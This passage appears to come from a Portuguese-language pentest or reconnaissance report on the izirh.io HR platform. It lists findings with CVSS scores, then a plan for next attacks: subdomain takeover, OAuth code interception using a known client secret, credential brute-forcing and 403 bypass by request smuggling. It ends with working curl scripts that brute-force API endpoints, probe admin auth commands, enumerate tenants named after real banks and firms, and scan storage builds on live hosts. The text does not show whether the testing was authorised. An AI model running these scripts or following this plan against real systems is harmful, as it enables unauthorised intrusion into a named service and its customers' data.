**Descricao:** A biblioteca `import-map-overrides@2.2.0` esta carregada em todas as paginas de producao. Permite sobrescrever modulos single-spa em runtime.

**Impacto:** Um XSS ou acesso fisico ao browser pode redirecionar MFEs para codigo malicioso.

**Remediaca:** Remover `import-map-overrides` em producao ou configurar whitelist restritiva.

**CVSS: 6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)**

---

### V-007: Enumeracao de Tenants via API Publica (BAIXO)

**Descricao:** O endpoint `GET /api/configurations/get-client-configurations?origin=<tenant>` retorna `{}` para tenants existentes e `INTERNAL_ERROR` para inexistentes.

**Impacto:** Permite mapear todos os clientes/tenants da plataforma izirh.

**Remediacao:** Retornar resposta padrao independente da existencia do tenant ou exigir autenticacao.

**CVSS: 2.7 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)**

---

## 16. PROXIMOS PASSOS

### Prioridade Alta

1. **Subdomain Takeover** (requer conta Azure)
   - Tentar criar `izi-uat.azurewebsites.net`
   - Verificar `izi-sit.azurewebsites.net`
   - Verificar `agreeable-meadow-09858d50f.azurestaticapps.net`

2. **LinkedIn OAuth Code Interception**
   - Completar o fluxo OAuth do LinkedIn para obter token de acesso
   - Usar token no comando `linkedin_login` da API izirh
   - Endpoint de callback retorna 503 — possivel interceptar o `code` da URL

3. **Google OAuth Attack Chain** (se redirect URI for encontrado)
   - Iniciar OAuth com `client_secret` conhecido
   - Interceptar authorization code via subdomain takeover ou open redirect
   - Trocar code por token e autenticar via `google_login`

### Prioridade Media

4. **Kudu/SCM Credential Bruteforce**
   - Expandir wordlist de senhas de publishing profile Azure

5. **403 Bypass Avancado em vagas.izirh.io**
   - WebSocket upgrade, HTTP/2 padding, chunked smuggling

6. **import-map-overrides Attack**
   - Acessar `sertec.izirh.io` no browser
   - Usar `importMapOverrides.addOverride()` para redirecionar MFE
   - Testar se `denylist:prod.*` pode ser contornado

7. **Analisar bundles nao explorados**
   - `mfe-crawler-data` (780KB - dados administrativos)
   - `mfe-dashboards`, `mfe-fit-cultural`

### Prioridade Baixa

8. **Email Enumeration via Forgot Password**
   - Testar com email valido vs invalido na v2 API

9. **Enumerar mais tenants** (Itau, Bradesco, Santander, etc.)

10. **Azure Functions Key Discovery**
    - Tentar encontrar `x-functions-key` via vazamento em logs ou error pages

---

## COMMANDS UTEIS

### Wordlist para brute force de endpoints v2
```bash
for path in \
  "/api/candidates" \
  "/api/candidates/change-candidature-phase" \
  "/api/candidates/disapproved-applications" \
  "/api/configurations/get-client-configurations" \
  "/api/configurations/tenant-data" \
  "/api/cultural-fit/ambassadors" \
  "/api/cultural-fit/ambassadors/invite" \
  "/api/custom-fields" \
  "/api/integrations/coodesh/assessments" \
  "/api/integrations/coodesh/attempts" \
  "/api/integrations/mindsight/archetypes" \
  "/api/integrations/mindsight/assessments" \
  "/api/notifications" \
  "/api/notifications/count" \
  "/api/notifications/status" \
  "/api/subdomains" \
  "/api/v2/candidate-hired/" \
  "/api/v2/roles" \
  "/api/vacancies/candidatures" \
  "/api/auth/forgot-password" \
  "/api/auth/idp/redirect" \
  "/api/health"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://izi-api-v2.izirh.io$path" -H "Accept: application/json")
  echo "$code $path"
done
```

### Testar auth commands
```bash
for cmd in \
  "email_password_login_admin" \
  "entra_id_login_admin" \
  "verify_token" \
  "refresh_admin_token" \
  "logout_admin_user" \
  "refresh_candidate_token" \
  "logout_candidate_user"; do
  echo -n "$cmd: "
  curl -s "https://izi-api.izirh.io/api/sertec-ms-auth" \
    -X POST -H "Content-Type: application/json" \
    -d "{\"command\":\"$cmd\",\"payload\":{}}" \
    2>&1 | head -1
done
```

### Enumerar tenants (wordlist)
```bash
for tenant in \
  sertec embraer itau bradesco santander bb caixa \
  accenture ambev petrobras vale braskem \
  magalu americanas ifood rappi uber 99 \
  renner marisa cvc gol latam \
  totvs sap oracle microsoft google \
  dasa fleury einstein sirio unimed \
  sulamerica porto porto-seguro mapa allianz \
  nubank inter c6 pagseguro stone \
  embresaer_sistemas \  # tentar com underscore, hifen, etc.
  ; do
  result=$(curl -s "https://izi-api-v2.izirh.io/api/configurations/get-client-configurations?origin=$tenant.izirh.io" -H "Accept: application/json")
  if echo "$result" | grep -q '^\{\}$'; then
    echo "LIVE: $tenant.izirh.io"
  fi
done
```

### Range de builds no blob (variar para encontrar dev/uat)
```bash
# Os builds conhecidos sao numeros sequenciais
base="https://izishared.blob.core.windows.net/mfes/admin-login/build-"
for i in $(seq 440200 440250); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$base$i/izi-mfe-admin-login.js")
  if [ "$code" = "200" ]; then
    echo "FOUND: build-$i"
  fi
done
```
